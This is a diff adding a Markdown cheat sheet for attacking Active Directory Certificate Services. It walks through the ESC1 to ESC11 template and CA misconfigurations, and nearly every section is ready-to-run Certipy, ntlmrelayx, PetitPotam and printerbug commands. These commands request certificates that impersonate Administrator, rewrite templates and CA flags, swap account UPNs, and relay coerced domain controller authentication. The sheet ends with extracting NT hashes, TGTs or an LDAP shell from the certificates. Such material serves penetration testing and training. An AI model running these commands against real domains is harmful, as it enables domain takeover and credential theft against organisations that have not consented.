@@ -1,0 +1,264 @@
+# AD Certificate Services (ADCS)
+
+## Enumeration
+
+Start with Certipy's vulnerable scan to quickly identify exploitable templates: it checks all known ESC conditions in one pass.
+
+```bash
+# Find vulnerable templates
+certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -vulnerable -stdout
+
+# Full enumeration to JSON (also outputs CA hostnames needed for $CA_HOST)
+certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $DC_IP
+```
+
+## ESC1: Enrollee Supplies Subject
+
+**Conditions:**
+- Low-priv user can enrol
+- No Manager Approval
+- No Authorised Signatures
+- Client Authentication EKU enabled
+- Template allows user to specify SAN (subjectAltName)
+
+The SAN field isn't validated, so you can request a cert claiming to be any domain user including Administrator.
+
+```bash
+# Request cert as any user
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template $TEMPLATE \
+  -upn administrator@$DOMAIN
+
+# Authenticate with cert → get NT hash
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+```
+
+## ESC2: Any Purpose EKU
+
+**Conditions:**
+- Low-priv user can enrol
+- No Manager Approval
+- No Authorised Signatures
+- Template has `Any Purpose` EKU or no EKU at all
+
+With Any Purpose EKU the cert can be used for client auth, making it usable to request further certificates on behalf of other users.
+
+```bash
+# Request cert
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template $TEMPLATE
+
+# Use cert to request another cert on behalf of another user
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template User \
+  -on-behalf-of $DOMAIN\\administrator \
+  -pfx $USER.pfx
+```
+
+## ESC3: Enrolment Agent
+
+**Conditions:**
+- Template has `Certificate Request Agent` EKU
+- Another template allows enrolment agent to enrol on behalf of others
+
+Two-step: get an enrolment agent cert first, then use it to request a cert impersonating an admin on a second template.
+
+```bash
+# Step 1: Get enrolment agent cert
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template $TEMPLATE
+
+# Step 2: Request cert on behalf of admin using agent cert
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template $TEMPLATE \
+  -on-behalf-of $DOMAIN\\administrator \
+  -pfx agent.pfx
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+```
+
+## ESC4: Writable Template
+
+**Conditions:**
+- You have write rights on a certificate template: Owner, Write Owner, Write DACL, or Write Property
+
+Overwrite the template's attributes to introduce ESC1 conditions, exploit it, then restore the original config.
+
+```bash
+# Overwrite template to be ESC1-vulnerable
+certipy template -u $USER@$DOMAIN -p $PASSWORD \
+  -template $TEMPLATE -save-old
+
+# Then exploit as ESC1
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template $TEMPLATE \
+  -upn administrator@$DOMAIN
+
+# Restore original template after
+certipy template -u $USER@$DOMAIN -p $PASSWORD \
+  -template $TEMPLATE -configuration <old-config>
+```
+
+## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
+
+**Conditions:**
+- CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set
+- Any template with Client Authentication EKU is exploitable
+
+This flag on the CA makes every Client Authentication template behave like ESC1: request any template with client auth EKU and supply an arbitrary SAN.
+
+```bash
+# Works like ESC1: request any template with client auth
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template User \
+  -upn administrator@$DOMAIN
+```
+
+## ESC7: Vulnerable CA ACL
+
+**Conditions:**
+- You have `ManageCA` or `ManageCertificates` rights on the CA
+
+ManageCA lets you enable the EDITF flag (turning it into ESC6), while ManageCertificates lets you approve pending failed requests.
+
+```bash
+# With ManageCA: enable EDITF_ATTRIBUTESUBJECTALTNAME2
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -enable-editf
+
+# Then exploit as ESC6
+
+# With ManageCertificates: approve failed requests
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -issue-request <request-id>
+```
+
+## ESC8: NTLM Relay to AD CS HTTP
+
+**Conditions:**
+- AD CS has HTTP enrolment endpoint enabled (certsrv)
+- SMB signing disabled on target
+
+Relay an incoming NTLM auth (coerced from the DC) to the certsrv endpoint to obtain a domain controller certificate, then use PKINIT for a DA hash.
+
+```bash
+# Start relay
+ntlmrelayx.py -t http://$CA_HOST/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+
+# Coerce DC authentication
+printerbug.py $DOMAIN/$USER:$PASSWORD@$DC_HOST $LHOST
+PetitPotam.py $LHOST $DC_HOST
+
+# Authenticate with obtained cert
+certipy auth -pfx dc.pfx -dc-ip $DC_IP
+```
+
+## ESC9: No Security Extension
+
+**Conditions:**
+- Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag
+- You have GenericWrite on an account
+
+Without the security extension the cert isn't bound to a specific account SID, so temporarily changing a victim's UPN to match the admin gets you a valid admin cert.
+
+```bash
+# Change UPN of account to admin
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -user $TARGET -upn administrator
+
+# Request cert as target
+certipy req -u $TARGET@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template $TEMPLATE
+
+# Restore UPN
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -user $TARGET -upn $TARGET@$DOMAIN
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -domain $DOMAIN
+```
+
+## ESC10: Weak Certificate Mappings
+
+**Conditions:**
+- Registry key `StrongCertificateBindingEnforcement` = 0 or 1 (not 2)
+- OR `CertificateMappingMethods` has UPN bit set
+
+Similar to ESC9: weak mapping means the DC resolves cert to account by UPN rather than by SID, so a UPN swap is all you need.
+
+```bash
+# Change UPN then request cert
+certipy account update -u $USER@$DOMAIN -p $PASSWORD \
+  -user $TARGET -upn administrator@$DOMAIN
+
+certipy req -u $TARGET@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template User
+
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP -ldap-shell
+```
+
+## ESC11: IF_ENFORCEENCRYPTICERTREQUEST
+
+**Conditions:**
+- CA has `IF_ENFORCEENCRYPTICERTREQUEST` not set
+- Allows NTLM relay over RPC (not just HTTP)
+
+Like ESC8 but over the RPC interface instead of HTTP: useful when certsrv isn't exposed.
+
+```bash
+ntlmrelayx.py -t rpc://$CA_HOST -rpc-mode ICPR \
+  -icpr-ca-name "$CA" --adcs --template DomainController
+
+# Coerce auth then authenticate with cert
+certipy auth -pfx dc.pfx -dc-ip $DC_IP
+```
+
+## Post-Exploitation with Certificates
+
+Once you have a PFX, use PKINIT to get the NT hash or a TGT: or fall back to Schannel LDAP shell if PKINIT is unavailable (e.g. no smart card logon EKU).
+
+```bash
+# Get NT hash from cert (PKINIT)
+certipy auth -pfx $USER.pfx -dc-ip $DC_IP
+
+# Get TGT from cert
+certipy auth -pfx $USER.pfx -dc-ip $DC_IP -no-hash
+
+# LDAP shell (useful when PKINIT not available: Schannel)
+certipy auth -pfx $USER.pfx -dc-ip $DC_IP -ldap-shell
+```
